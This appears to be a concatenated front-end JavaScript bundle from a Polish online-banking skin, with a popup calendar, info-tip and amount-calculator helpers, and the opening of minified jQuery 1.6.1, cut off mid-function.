function popUpCalendar(ctlName, sYear, eYear)
{
    var leftpos=0;
    var lefttmp=0;
    var toppos=0;
    var toptmp=0;
    var ctl = document.getElementById(ctlName); // obiekt obrazka
    var ctl2 = document.getElementsByName(ctlName)[0]; // obiekt inputa

  try {
     closeInfoDivTip();
     if (document.getElementById('calculatorDiv')) {
       closeInfoDivTip('calculatorDiv', 'calculatorDiv_message');
     }
  } catch(e) {
     //alert(e);
  }

	if (bPageLoaded)
	{
		if ( crossobj.visibility ==	"hidden" )
        {
            ctlToPlaceValue = ctl2;

            //dateFormat='yyyy-mm-dd';
            var formatChar='-';

            var aData = ctl2.value.split(formatChar);

            daySelected = aData[2];
            monthSelected = aData[1];
            yearSelected = aData[0];

            daySelected = parseInt(daySelected, 10);
            monthSelected = parseInt(monthSelected, 10) - 1;
            yearSelected = parseInt(yearSelected, 10);

            if(sYear <= eYear)
            {
                beginYear = sYear;
                endYear = eYear;
            }
            else
            {
                beginYear = eYear;
                endYear = sYear;
            }

            if (isNaN(daySelected)||isNaN(monthSelected)||isNaN(yearSelected)
                    || yearSelected > endYear || yearSelected < beginYear
                    || monthSelected < 0 || monthSelected > 11
                    || daySelected < 1 || daySelected > 31)
            {
              daySelected = dateNow
              monthSelected = monthNow
              yearSelected = yearNow
            }

            if(yearSelected > endYear)
            {
                daySelected = 31;
                monthSelected = 11;
                yearSelected = endYear;
            }
            if(yearSelected < beginYear)
            {
                daySelected = 1;
                monthSelected = 0;
                yearSelected = beginYear;
            }

			odaySelected=daySelected
			omonthSelected=monthSelected
			oyearSelected=yearSelected

			var aTag = ctl
			leftpos = 0;
			toppos = 0;
			while(aTag && aTag.tagName.toUpperCase()!="BODY") {
				aTag = aTag.offsetParent;
				if (aTag) {
  				  leftpos	+= aTag.offsetLeft;
				  toppos += aTag.offsetTop;
				}
			} 
            lefttmp = ctl.offsetLeft + leftpos + ctl.offsetWidth + 25;
            left_e = fixedX==-1 ? (lefttmp + 180 > document.body.offsetWidth ? document.body.offsetWidth - 250 : lefttmp) : fixedX;
			crossobj.left = left_e + "px";
			toptmp = ctl.offsetTop + toppos - 150;
			top_e = fixedY==-1 ? (toptmp < document.body.scrollTop ? document.body.scrollTop + 5 : toptmp) : fixedY
			crossobj.top = top_e + "px";
			constructCalendar ();
			crossobj.visibility=(dom||ie)? "visible" : "show"

			hideElement( 'SELECT', document.getElementById("calendar") );
			hideElement( 'APPLET', document.getElementById("calendar") );
		}
		else
		{
			hideCalendar()
			if (ctlNow !=ctl)
            {
                popUpCalendar(ctlName)
            }
		}
		ctlNow = ctl
	}
}

function hidecal1(event)
{
    var evt = event ? event: window.event;
    var charCode = evt.keyCode ? evt.keyCode : evt.charCode;
    if(charCode==27)
        hideCalendar()
    return true;
}

document.body.onclick = function hidecal2()
{
	if (!bShow && !bShow2)
	{
		hideCalendar()
	}
	bShow = false
}

function dateToString (week_day, c_day, c_month, c_year)
{
    return "" + dayName2[(week_day-1==-1)?6:(week_day-1)] + ", " + c_day + " " + monthName2[c_month]	+ "	" +	c_year;
}

/* /ikd_scripts/skins/ipko/popcalendar.js end */
/* /ikd_scripts/skins/ipko/infTip.js?v=4 start */
var ver_ie=document.all;

// INFO TIP
function closeInfoDivTip(divName, tipContentName)
{
   div = document.getElementById('infoTipDiv');
   if (divName) {
     div = document.getElementById(divName);
   }

   if (div) {
     div.style.display = "none";
     div_text = document.getElementById('infoTipDiv_message');
     if (tipContentName) {
       div_text = document.getElementById(tipContentName);
     }
     if (div_text) {
        div_text.innerHTML = "";
     }
     if (ver_ie) {
        fixShowElement( 'APPLET' );
        fixShowElement( 'SELECT' );
     }
   } 
   
   try {
     hideCalendar()
   } catch(e) {
     //alert(e);
   }
   
   bShow2 = false;

}

function infoTip(tipContent, element)
{
   return infoTipDiv(tipContent, element);
}

function infoTipDiv(tipContent, elem, divName, tipContentName) 
{    
  closeInfoDivTip();
  if (document.getElementById('calculatorDiv')) {
    closeInfoDivTip('calculatorDiv', 'calculatorDiv_message');
  }

  var pos = getPosition(elem);
  var winsize = windowSize();

  div_text = document.getElementById('infoTipDiv_message');
  if (tipContentName) {
    div_text = document.getElementById(tipContentName);
  }
  if ( div_text ) {
     div_text.innerHTML = tipContent;
  }
  
  div = document.getElementById('infoTipDiv');
  if (divName) {
    div = document.getElementById(divName);
  }

  if (div) { 
     var dimsize = new Array(180, div.offsetHeight);
     
     if (pos[0] > winsize[0] - dimsize[0] - 40) {
        pos[0] = winsize[0] - dimsize[0] - 40;
     }
     var documentsize = $('body').height();
     if (pos[1] > documentsize - dimsize[1] - 40) {
        pos[1] = documentsize - dimsize[1] - 40;
     }
     
     div.style.left = pos[0]+'px';
     div.style.top = pos[1]+'px';

     div.style.display = "block";

     
     if (ver_ie) {
        fixHideElement( 'APPLET', div );			
        fixHideElement( 'SELECT', div );
     }
     bShow = true;
     if (divName) {
       calculatorCountTimeout();
       document.getElementById('calc_amount_0').focus();
       document.getElementById('calc_amount_0').select();
     }
  }

}

function infoTipLink(url, element) {
    return infoTipDivLink(url, element);
}

function infoTipDivLink(tipName, elem)
{
  closeInfoDivTip();
  if (document.getElementById('calculatorDiv')) {
    closeInfoDivTip('calculatorDiv', 'calculatorDiv_message');
  }

  var pos = getPosition(elem);
  var winsize = windowSize();

  tipName = tipName + "_title";
  
  var tipContent = "";
  try {
    eval("tipContent = " + tipName +";");
  } catch(c) {
    tipContent = "Przepraszamy - w³a¶ciwa tre¶æ pomocy nie mo¿e byæ wy¶wietlona. Prosimy o zg³oszenie problemu konsultantowi.";
  }

  div_text = document.getElementById('infoTipDiv_message');
  if ( div_text ) {
     div_text.innerHTML = tipContent;
  }
  
  div = document.getElementById('infoTipDiv');
  
  if (div) { 
     var dimsize = new Array(180, div.offsetHeight);
     
     if (pos[0] > winsize[0] - dimsize[0] - 40) {
        pos[0] = winsize[0] - dimsize[0] - 40;
     }
     var documentsize = $('body').height();
     if (pos[1] > documentsize - dimsize[1] - 40) {
        pos[1] = documentsize - dimsize[1] - 40;
     }
     
     div.style.left = pos[0]+'px';
     div.style.top = pos[1]+'px';

     div.style.display = "block";

     if (ver_ie) {
        fixHideElement( 'SELECT', div );
        fixHideElement( 'APPLET', div );			
     }
     bShow2 = true;
  }    
}


function getPosition(element) {
     var aTag = element;
     leftpos = 0;
     toppos = 0;
     while(aTag && aTag.tagName.toUpperCase()!="BODY") {
         aTag = aTag.offsetParent;
         if (aTag) {
            leftpos	+= aTag.offsetLeft;
            toppos += aTag.offsetTop;
         }
     } 
     leftpos = element.offsetLeft + leftpos + element.offsetWidth + 10;
     toppos = element.offsetTop + toppos + 10;
     
     return new Array(leftpos, toppos);    
}

function windowSize() {
  
  var winW = 630, winH = 460, scroll = 0;

  scroll = document.body.scrollTop;

  if (parseInt(navigator.appVersion)>3) {
    if (navigator.appName=="Netscape" || navigator.appName=="Opera") {
       winW = window.innerWidth;
       winH = window.innerHeight;
       /*if (scroll == 0) {
         scroll = scrollY;
       }*/
    }
    if (navigator.appName.indexOf("Microsoft")!=-1) {
       winW = document.body.offsetWidth;
       winH = document.body.offsetHeight;
    }
  }

  winH = winH + scroll;
  
  return new Array(winW, winH);
}

function fixHideElement( elmID, overDiv)
{
    if( ver_ie )
    {
        for( i = 0; i < document.all.tags( elmID ).length; i++ )
        {
            obj = document.all.tags( elmID )[i];
            if ( !obj || !obj.offsetParent ) 
                continue;
            
            objLeft   = obj.offsetLeft;
            objTop    = obj.offsetTop;
            objParent = obj.offsetParent;
            
            while( objParent && objParent.tagName.toUpperCase() != "BODY")
            {
                objLeft  += objParent.offsetLeft;
                objTop   += objParent.offsetTop;
                objParent = objParent.offsetParent;
            }
            
            objHeight = obj.offsetHeight;
            objWidth = obj.offsetWidth;
            
            if(( overDiv.offsetLeft + overDiv.offsetWidth ) <= objLeft );
            else if(( overDiv.offsetTop + overDiv.offsetHeight + 50 ) <= objTop );
            else if( overDiv.offsetTop >= ( objTop + objHeight ));
            else if( overDiv.offsetLeft >= ( objLeft + objWidth ));
            else
                obj.style.visibility = "hidden";
        }
    }
}
 
function fixShowElement( elmID )
{
    if( ver_ie )
    {
        for( i = 0; i < document.all.tags( elmID ).length; i++ )
        {
            obj = document.all.tags( elmID )[i];
        
            if( !obj || !obj.offsetParent )
                continue;
            obj.style.visibility = "";
        }
    }
}

function selQuick()
{
	var sel = document.getElementById('selectwniosekonline');
	if (sel) {
  	  var sel_idx = sel.selectedIndex;
	  var selected = sel.options[sel_idx].value;
	  if (selected) {
	     clickMenu(selected);	
	  }
	}
}

function hideinfotip()
{
	if (!bShow && !bShow2)
	{
     closeInfoDivTip();
     if (document.getElementById('calculatorDiv')) {
       closeInfoDivTip('calculatorDiv', 'calculatorDiv_message');
     }
	}
	bShow2 = false;
	bShow = false;
}

function initInfoTip() {
  bShow2=false;
  bShow=false;
  document.body.onclick = hideinfotip
}

function set_login_news() {
}

function set_news(id) {
  var news_1 = document.getElementById('news_1');
  var news_2 = document.getElementById('news_2');
  var news_3 = document.getElementById('news_3');
  if (id==1) {
    if (news_1) {
      news_1.className = "active";
    }
    if (news_2) {
      news_2.className = "";
    }
    if (news_3) {
      news_3.className = "";
    }
  } else if (id == 2) {
    if (news_2) {
      news_2.className = "active";
    }
    if (news_1) {
      news_1.className = "";
    }
    if (news_3) {
      news_3.className = "";
    }
  } else if (id == 3) {
    if (news_3) {
      news_3.className = "active";
    }
    if (news_2) {
      news_2.className = "";
    }
    if (news_1) {
      news_1.className = "";
    }
  } 
}

// funkcje do obslugi kakulatora sum dostepnego przy polach typu kwota
var amount_list = new Array('0,00', '0,00'); //lista kwot
var amount_input_name; //nazwa pola do ktorego ma byc wstawiona zsumowana wartosc

// funkcja tworzaca input do wprodzawania kwoty
function calculatorAmount(amount_value, amount_id, amountClass) {
  amount_value = amount_value.replace(".",",");
  amount = '<input onblur="calculatorCount(this)" class="' + amountClass+ '" style="text-align: right;font-size: 10px; margin-bottom: 1px;" value="' + amount_value + '" type="text" class="formField" size="15" maxlength="15" name="calc_amount_' + amount_id + '" id="calc_amount_' + amount_id + '" tabindex="10" onkeypress="return calculatorHelper(event, this);"/><br>';
  return amount;
}

// funkcja tworzaca wszystkie pola do wprowadzenia kwoty
function calculatorAmounts(amount_list) {
  var amount = '';
  for( i = 0; i < amount_list.length; i++ ) {
    if (!validateAmount(amount_list[i], 1)) {
      amountClass = 'errFormField';
    } else {
      amountClass = '';
    }
    amount += calculatorAmount(amount_list[i], i, amountClass);
  }
  return amount;
}

// funkcja inicjujaca kalkulator
function calculatorInit(elem) {
  amount_input_name = elem;
  amount_list = new Array('0,00', '0,00');
  return calculatorAmounts(amount_list);
}

// funkcja dodajaca kwoty
function setCalcSum(calc_sum, value) {
  var sum;
  sum = eval(calc_sum)*100 + eval(value)*100;
  sum = sum/100;
  return sum;
}

// funkcja sumujaca kwoty co 1s
function calculatorCountTimeout() {
  if (document.getElementById("calc_amount_0")) {
    var calc_sum = 0;
    for( i = 0; i < amount_list.length; i++ ) {
      input = document.getElementById("calc_amount_" + i);
      value = input.value.replace(",",".");
      if (!validateAmount(value, 1)) {
        v = 0;
        input.className = 'errFormField';
      } else {
        v = validateAmount(value, 1);
        input.className = '';
      }
      calc_sum = setCalcSum(calc_sum, v);
    }
    if (document.getElementById('calculatorDiv_summary')) {
      document.getElementById('calculatorDiv_summary').innerHTML = displayAmount(calc_sum);
    }
    setTimeout("calculatorCountTimeout();", 1000);
  }
}

// funkcja sumujaca kwoty
function calculatorCount(elem) {
  var i;
  var amount_list_count = amount_list.length;
  if (elem) {
    i = elem.id.replace("calc_amount_","");
    if (elem.value) {
      v = validateAmount(elem);
      amount_list[i] = v;
    } else {
      if (amount_list.length <= 2) {
        amount_list[i] = '0,00';
      } else {
        amount_list.splice(i, 1);
      }
    }
  }
  var amount_list_length = amount_list.length;
  var calc_sum = 0;
  for( i = 0; i < amount_list.length; i++ ) {
    amount_list[i] = amount_list[i].replace(",",".");
    value = validateAmount(amount_list[i], 1);
    calc_sum = setCalcSum(calc_sum, value);
  }
  div_text = document.getElementById('calculatorDiv_message');
  if ( div_text ) {
    if (amount_list_count != amount_list_length) {
      div_text.innerHTML = calculatorAmounts(amount_list);
      lastAmountFocus();
    }
  }
  if (document.getElementById('calculatorDiv_summary')) {
    document.getElementById('calculatorDiv_summary').innerHTML = displayAmount(calc_sum);
  }
}

// funkcja ustawiajaca focus na ostatnim polu
function lastAmountFocus() {
  id = amount_list.length - 1;
  fieldToFocusId = "calc_amount_" + id;
  if (document.getElementById(fieldToFocusId)) {
    fieldToFocus = document.getElementById(fieldToFocusId);
    fieldToFocus.focus();
    fieldToFocus.select();
  }
}

// funkcja dodajaca dodatkowe pole do wprowadzenia kwoty
function calculatorAddAmount() {
  amount_list.push('0,00');
  div_text = document.getElementById('calculatorDiv_message');
  if ( div_text ) {
     div_text.innerHTML = calculatorAmounts(amount_list);
     lastAmountFocus();
  }
}

// funkcja wstawiajaca zsumowana wartosc do pola formularza
function calculatorInsertAmount() {
  var calc_sum = 0;
  for( i = 0; i < amount_list.length; i++ ) {
    amount_list[i] = amount_list[i].replace(",",".");
    value = validateAmount(amount_list[i], 1);
    calc_sum = setCalcSum(calc_sum, value);
  }
  calc_sum = displayAmount(calc_sum);
  var sums = calc_sum.split(",");
  var v = sums[0].replace(/[ ]+/g, '');
  document.getElementById(amount_input_name + '.part1').value = v;
  document.getElementById(amount_input_name + '.part2').value = sums[1];
}

// funkcja sprawdzajaca czy wprowadzona wartosc jest liczba, jesli nie wstawiana jest '0,00'
function validateAmount(elem, text) {
  amountRe = /^0*(\-?\d{1,15}(?:[,\.](\d{2}))?)$/;
  if (text) {
    var v = elem.replace(/[ ]+/g, '');
    var m = v.match(amountRe);
    if (m) {
      return v;
    } else {
      return 0;
    }
  } else {
    var v = elem.value.replace(/[ ]+/g, '');
    var m = v.match(amountRe);
    if (m) {
        v = m[1];
            invalid = false;
            if (!m[2]) { // nie mamy nic po przecinku
                v = v + ',00';
            } else {
                v = v.replace('.', ',');
            }
    }
    return v;
  }
}

// funkcja formatujaca kwote na _,_ _
function displayAmount(elem) {
  var number = new Number(elem);
  number = number.toFixed(2);
  var sums = number.split(".");
  value = sums[0];
  value = value.split("").reverse().join("");
  value = value.replace(/(\d{3})/g,"$1 ");
  value = value.split("").reverse().join("");
  return value + ',' + sums[1];
}

// funkcja pozwalajaca po uzyciu znaku '+' na przejscie do kolejnego pola
function calculatorHelper(evt, fieldSelected)
{
    var charCode = evt.charCode ? evt.charCode : evt.which == 0 ? 0 : evt.keyCode;
    if(charCode == 43)
    {
        if(fieldSelected)
        {
            fieldToFocusId = fieldSelected.id.replace("calc_amount_","");
            fieldToFocusId = eval(fieldToFocusId) + 1;
            fieldToFocusId = "calc_amount_" + fieldToFocusId;
            if (document.getElementById(fieldToFocusId)) {
              fieldToFocus = document.getElementById(fieldToFocusId);
              fieldToFocus.focus();
              fieldToFocus.select();
            } else {
              calculatorCount(fieldSelected)
              calculatorAddAmount();
            }
            if(!(evt.which || evt.which == 0)) // IE
                evt.keyCode = 0;
            return false;
        }
    }
    return true;
}

/* /ikd_scripts/skins/ipko/infTip.js?v=4 end */
/* /ikd_scripts/skins/ipko/jquery-1.6.1.min.js start */
/*!
 * jQuery JavaScript Library v1.6.1
 * http://jquery.com/
 *
 * Copyright 2011, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 * Copyright 2011, The Dojo Foundation
 * Released under the MIT, BSD, and GPL Licenses.
 *
 * Date: Thu May 12 15:04:36 2011 -0400
 */
(function(a,b){function cy(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cv(a){if(!cj[a]){var b=f("<"+a+">").appendTo("body"),d=b.css("display");b.remove();if(d==="none"||d===""){ck||(ck=c.createElement("iframe"),ck.frameBorder=ck.width=ck.height=0),c.body.appendChild(ck);if(!cl||!ck.createElement)cl=(ck.contentWindow||ck.contentDocument).document,cl.write("<!doctype><html><body></body></html>");b=cl.createElement(a),cl.body.appendChild(b),d=f.css(b,"display"),c.body.removeChild(ck)}cj[a]=d}return cj[a]}function cu(a,b){var c={};f.each(cp.concat.apply([],cp.slice(0,b)),function(){c[this]=a});return c}function ct(){cq=b}function cs(){setTimeout(ct,0);return cq=f.now()}function ci(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ch(){try{return new a.XMLHttpRequest}catch(b){}}function cb(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function ca(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function b_(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bF.test(a)?d(a,e):b_(a+"["+(typeof e=="object"||f.isArray(e)?b:"")+"]",e,c,d)});else if(!c&&b!=null&&typeof b=="object")for(var e in b)b_(a+"["+e+"]",b[e],c,d);else d(a,b)}function b$(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bU,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=b$(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=b$(a,c,d,e,"*",g));return l}function bZ(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bQ),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bD(a,b,c){var d=b==="width"?bx:by,e=b==="width"?a.offsetWidth:a.offsetHeight;if(c==="border")return e;f.each(d,function(){c||(e-=parseFloat(f.css(a,"padding"+this))||0),c==="margin"?e+=parseFloat(f.css(a,"margin"+this))||0:e-=parseFloat(f.css(a,"border"+this+"Width"))||0});return e}function bn(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bf,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function bm(a){f.nodeName(a,"input")?bl(a):a.getElementsByTagName&&f.grep(a.getElementsByTagName("input"),bl)}function bl(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bk(a){return"getElementsByTagName"in a?a.getElementsByTagName("*"):"querySelectorAll"in a?a.querySelectorAll("*"):[]}function bj(a,b){var c;if(b.nodeType===1){b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(f.expando)}}function bi(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c=f.expando,d=f.data(a),e=f.data(b,d);if(d=d[c]){var g=d.events;e=e[c]=f.extend({},d);if(g){delete e.handle,e.events={};for(var h in g)for(var i=0,j=g[h].length;i<j;i++)f.event.add(b,h+(g[h][i].namespace?".":"")+g[h][i].namespace,g[h][i],g[h][i].data)}}}}function bh(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function X(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(S.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function W(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function O(a,b){return(a&&a!=="*"?a+".":"")+b.replace(A,"`").replace(B,"&")}function N(a){var b,c,d,e,g,h,i,j,k,l,m,n,o,p=[],q=[],r=f._data(this,"events");if(!(a.liveFired===this||!r||!r.live||a.target.disabled||a.button&&a.type==="click")){a.namespace&&(n=new RegExp("(^|\\.)"+a.namespace.split(".").join("\\.(?:.*\\.)?")+"(\\.|$)")),a.liveFired=this;var s=r.live.slice(0);for(i=0;i<s.length;i++)g=s[i],g.origType.replace(y,"")===a.type?q.push(g.selector):s.splice(i--,1);e=f(a.target).closest(q,a.currentTarget);for(j=0,k=e.length;j<k;j++){m=e[j];for(i=0;i<s.length;i++){g=s[i];if(m.selector===g.selector&&(!n||n.test(g.namespace))&&!m.elem.disabled){h=m.elem,d=null;if(g.preType==="mouseenter"||g.preType==="mouseleave")a.type=g.preType,d=f(a.relatedTarget).closest(g.selector)[0],d&&f.contains(h,d)&&(d=h);(!d||d!==h)&&p.push({elem:h,handleObj:g,level:m.level})}}}for(j=0,k=p.length;j<k;j++){e=p[j];if(c&&e.level>c)break;a.currentTarget=e.elem,a.data=e.handleObj.data,a.handleObj=e.handleObj,o=e.handleObj.origHandler.apply(e.elem,arguments);if(o===!1||a.isPropagationStopped()){c=e.level,o===!1&&(b=!1);if(a.isImmediatePropagationStopped())break}}return b}}function L(a,c,d){var e=f.extend({},d[0]);e.type=a,e.originalEvent={},e.liveFired=b,f.event.handle.call(c,e),e.isDefaultPrevented()&&d[0].preventDefault()}function F(){return!0}function E(){return!1}function m(a,c,d){var e=c+"defer",g=c+"queue",h=c+"mark",i=f.data(a,e,b,!0);i&&(d==="queue"||!f.data(a,g,b,!0))&&(d==="mark"||!f.data(a,h,b,!0))&&setTimeout(function(){!f.data(a,g,b,!0)&&!f.data(a,h,b,!0)&&(f.removeData(a,e,!0),i.resolve())},0)}function l(a){for(var b in a)if(b!=="toJSON")return!1;return!0}function k(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(j,"$1-$2").toLowerCase();d=a.getAttribute(e);if(typeof d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNaN(d)?i.test(d)?f.parseJSON(d):d:parseFloat(d)}catch(g){}f.data(a,c,d)}else d=b}return d}var c=a.document,d=a.navigator,e=a.location,f=function(){function H(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(H,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/\d/,n=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,o=/^[\],:{}\s]*$/,p=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,q=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,r=/(?:^|:|,)(?:\s*\[)+/g,s=/(webkit)[ \/]([\w.]+)/,t=/(opera)(?:.*version)?[ \/]([\w.]+)/,u=/(msie) ([\w.]+)/,v=/(mozilla)(?:.*? rv:([\w.]+))?/,w=d.userAgent,x,y,z,A=Object.prototype.toString,B=Object.prototype.hasOwnProperty,C=Array.prototype.push,D=Array.prototype.slice,E=String.prototype.trim,F=Array.prototype.indexOf,G={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=n.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.6.1",length:0,size:function(){return this.length},toArray:function(){return D.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?C.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),y.done(a);return this},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(D.apply(this,arguments),"slice",D.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:C,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;y.resolveWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").unbind("ready")}},bindReady:function(){if(!y){y=e._Deferred();if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",z,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",z),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&H()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a&&typeof a=="object"&&"setInterval"in a},isNaN:function(a){return a==null||!m.test(a)||isNaN(a)},type:function(a){return a==null?String(a):G[A.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;if(a.constructor&&!B.call(a,"constructor")&&!B.call(a.constructor.prototype,"isPrototypeOf"))return!1;var c;for(c in a);return c===b||B.call(a,c)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw a},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(o.test(b.replace(p,"@").replace(q,"]").replace(r,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(b,c,d){a.DOMParser?(d=new DOMParser,c=d.parseFromString(b,"text/xml")):(c=new ActiveXObject("Microsoft.XMLDOM"),c.async="false",c.loadXML(b)),d=c.documentElement,(!d||!d.nodeName||d.nodeName==="parsererror")&&e.error("Invalid XML: "+b);return c},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:E?function(a){return a==null?"":E.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?C.call(c,a):e.merge(c,a)}return c},inArray:function(a,b){if(F)return F.call(b,a);for(var 